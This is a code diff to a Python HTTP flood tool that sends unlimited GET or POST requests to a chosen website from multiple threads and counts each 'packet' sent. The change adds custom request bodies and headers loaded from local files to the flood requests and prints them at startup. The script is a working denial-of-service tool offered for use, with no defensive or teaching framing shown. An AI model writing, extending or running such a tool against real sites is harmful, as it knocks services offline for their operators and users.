@@ -1,12 +1,17 @@
 import requests as reqs
 import threading as thread
 import time
+import json
+
+data = open("data.txt").read()
+h = open("headers.json")
+headers = json.load(h)
 
 def httpGet(web, tnum):
 	packNo=1
 	while 1:
 		try:
-			reqs.get(web)
+			reqs.get(web, data=data, headers=headers)
 			print(f"[THREAD-{tnum}]Packet No {packNo} sent to {web} succesfully!")
 			packNo += 1
 		except:
@@ -18,7 +23,7 @@ def httpPost(web, tnum):
 	while 1:
 		try:
 			isFail = False
-			a = reqs.post(web, data={"Created By":"BbayuGt"})
+			a = reqs.post(web, data=data, headers=headers)
 			print(f"[THREAD-{tnum}]Packet No {packNo} sent to {web} succesfully!")
 			packNo += 1
 		except:
@@ -72,6 +77,8 @@ def httpGetDialog():
 		tnum += 1
 	
 class main:
+	print("data loaded : "+data)
+	print("headers loaded : "+open("headers.json").read())
 	print("Select Mode :")
 	print("1. HTTP GET")
 	print("2. HTTP POST")
